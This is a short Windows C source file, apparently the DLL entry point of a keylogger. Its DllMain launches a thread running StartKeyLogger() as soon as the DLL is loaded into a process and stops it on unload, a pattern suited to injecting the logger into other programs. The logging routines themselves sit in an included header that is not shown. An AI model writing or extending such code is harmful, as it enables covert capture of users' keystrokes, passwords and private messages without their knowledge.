#include "Keylogger.h"

DWORD MainThread(LPVOID threadParam)
{
	StartKeyLogger();
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, NULL);
			break;
		case DLL_PROCESS_DETACH:
			StopKeyLogger();
			break;
		default:
			break;
	}
    return TRUE;
}
